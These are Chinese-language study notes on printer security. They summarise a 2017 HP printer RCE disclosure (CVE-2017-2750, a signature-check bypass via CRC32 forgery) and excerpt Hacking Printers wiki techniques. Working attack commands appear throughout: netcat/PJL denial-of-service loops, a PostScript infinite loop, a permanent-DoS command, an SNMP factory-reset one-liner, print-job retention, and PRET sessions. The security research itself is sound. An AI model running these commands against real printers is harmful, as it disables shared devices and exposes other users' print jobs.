# 打印机安全研究

## 打印协议与语言

### 设备控制

SNMP简单网络管理协议

### 打印通道

IPP互联网打印协议，LPD行式打印后台程序，SMB协议，原始端口打印协议

利用这些打印支持协议，向打印机进行恶意文档传播

### 作业控制语言

PJL（printer job language）

用于管理置纸托盘和纸张数量等打印机状态

### 页面描述语言

PS（PostScript）



# 快讯丨惠普企业打印机被曝含多种安全漏洞

源地址：https://www.hetianlab.com/html/news/news-2017112501.html

## 摘要

安全研究人员首先使用PRET（打印机漏洞利用工具包）对设备进行了测试，并成功找到了一个路径遍历漏洞，而这个漏洞允许他们访问任意打印机任务的内容，其中也包括受密码保护的打印机任务。除此之外，PRET还帮助他们找到了一个能够修改打印机任务内容的漏洞，一个能够将打印机恢复出厂设置的漏洞，还有一个能够移除管理员密码的漏洞。

注：[PERT](http://www.securityweek.com/printer-vulnerabilities-expose-organizations-attacks)是一款由德国波鸿鲁尔大学的研究人员所开发的一款打印机安全测试工具，研究人员表示，PERT能够扫描出二十多种不同品牌打印机中的安全漏洞，例如惠普、戴尔、三星和柯尼卡等。

但是，研究人员最终的目的是要找出一个能够允许他们远程执行任意代码的漏洞，也就是远程代码执行漏洞（RCE）。为了实现这个目标，他们提取出了打印机操作系统的固件并对其进行了逆向工程分析。虽然惠普采用了某些机制来防止他人对打印机的操作系统进行篡改，但是研究人员还是成功绕过了这些保护机制并访问到了系统固件文件。

接下来，研究人员分析了固件的更新机制以及惠普的软件解决方案。惠普的软件解决方案使用了OXP平台和SDK来扩展打印机的功能，而这两种解决方案以及固件更新机制都是通过一个单一的Bundle文件（.BDL）实现的，而这个文件需要验证一个有效签名。

在研究的过程中，研究人员无法给设备上传恶意固件，因为恶意固件的签名无法通过签名验证机制的检测，但是他们也提出了某些可行的攻击向量，感兴趣的同学可以自行深入研究。

另一方面，研究人员成功破解了软件解决方案所使用的文件签名验证机制。这也就意味着，他们将能够上传一个恶意DLL文件并执行任意代码。

## 后记

FoxGlove目前已经将研究过程中所使用的所有工具及相关源代码公布在了GitHub上，其中还包括PoC+恶意软件样本，感兴趣的同学可以访问他们的GitHub主页【[传送门](https://github.com/foxglovesec/HPwn)】以获取更多信息。

研究人员已经在2017年8月21日将漏洞信息上报给了惠普的技术人员，惠普表示将会在本周内给用户推送更新补丁。

目前，惠普已将这个远程代码执行漏洞标记为了CVE-2017-2750，并在11月17日[修复](https://support.hp.com/nz-en/document/c05839270)了该漏洞。请广大惠普打印机的用户尽快安装该更新补丁，以防止网络攻击的发生。

### 

# FoxGlove分析摘要

## PREF

PRET工具包在三种模式下运行，每种模式都指定工具包将尝试与打印机通信的“语言”。这些模式是打印机作业语言（PJL），PostScript（PS）和PCL

## 校验和构成

- 0x14-0x17 = 0x929至0x938的CRC32（IPKG标头）
- 0x931-0x934 = IPKG结构的长度
- 0x94d-0x950 = CRC32 of 0xd76至0xe89（ZIP标头）
- 0x929-0x92a =从BDL文件开始到IPKG结构的距离
- 0xe76-0xe77 = ZIP到IPKG标头的距离
- 0xe7e-0xe81 = ZIP文件的长度
- 0xe86-0xe89 = 0xe8b-EOF的CRC32（ZIP文件二进制）

## 攻击方法

从理论上讲，可以构造一个修改后的ZIP文件，使其具有与原始文件相同的长度和相同的CRC-32校验和。如果完成此操作，则无需更新BDL文件中的任何字段

通俗的来说，就是构造一个能通过签名校验和的固件升级包

## 具体实现

BDL_Patcher/hp_solution_pactcher.py 主要提供了绕过签名验证的方法

## 攻击目标

生成可替代的DLL文件，执行恶意代码

## 解决DLL文件签名方法

逆向工程，比较复杂

## 启示

1. 尚待挖掘的资源：PREF工具，打印机黑客维基http://hacking-printers.net/wiki/index.php/Main_Page

2. 文中提供了绕过惠普安全措施提取操作系统和固件的方法：删除需要加密要求的驱动器，更换没有加密的硬盘

   ```
   原文：
   First, HP ships their devices with FIPS compliant encrypted harddrives. When one of these special drives is inserted, all data on the drive is encrypted and if that drive is removed from the printer the data is unreadable to anyone without the encryption key. Furthermore, even if we were able to set or recover this key, the details of the encryption being used are unclear and would need to be discovered before data could be read from the drive.
   Instead, we simply removed the FIPS capable drive provided by HP and inserted a regular Toshiba laptop harddrive that did not support encryption:
   ```

   

3. 植入恶意代码的方法

# 网络安全打印机安全研究与防护建议

各安全漏洞类型统计

# 打印机黑客维基

## 拒绝服务

### 传输通道

使用PJL时，设置高时间间隔。原理上类似于DoS攻击

#### netcat方法

```
while true; do nc printer 9100; done
```

#### PJL方法

```
# get maximum timeout value with PJL
MAX="`echo "@PJL INFO VARIABLES" | nc -w3 printer 9100 |\
  grep -E -A2 '^TIMEOUT=' | tail -n1 | awk '{print $1}'`"
# connect and set maximum timeout for current job with PJL
while true; do echo "@PJL SET TIMEOUT=$MAX" | nc printer 9100; done
```

#### PREF方法

```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> env timeout
TIMEOUT=15 [2 RANGE]
       5
       300
```

### 处理文档

#### PostScript

最简单一种陷入死循环的方法

```
%!
{} loop
```

PREF实现

```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hang
Warning: This command causes an infinite loop rendering the
device useless until manual restart. Press CTRL+C to abort.
Executing PostScript infinite loop in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
```

可以实现该攻击的方法

```
USB Driver or cable
Port 9100 printing
Cross-site printing
```

实现永久DoS攻击的方法

```
true 0 start job
```

PJL实现

```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> offline "MESSAGE TO DSIPLAY"
Warning: Taking the printer offline will prevent yourself and others
from printing or re-connecting to the device. Press CTRL+C to abort.
Taking printer offline in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
```

## 特权升级

### 恢复出厂设置

#### SNMP方法

```
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```

可以实施攻击的攻击者

```
任何能够给161/udp发送网络包的用户
```

防护方法

```
防火墙，不知名SNMP公共字符串
```

## 打印作业访问

### 保留打印作业

PJL实现

```
@PJL SET HOLD=ON
[actual data to be printed follows]
```

PERF实现

```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```





## 攻击方法总结

1. 拒绝服务
2. 提权
   1. 恢复出厂设置
   2. 认证绕过
3. 打印作业访问
   1. 保留打印作业
   2. 修改打印作业
4. 信息披露
   1. 内存访问
   2. 文件系统访问
   3. 凭据泄露
5. 代码执行
   1. 缓冲区溢出
   2. 固件更新
   3. 安装自定义软件
6. 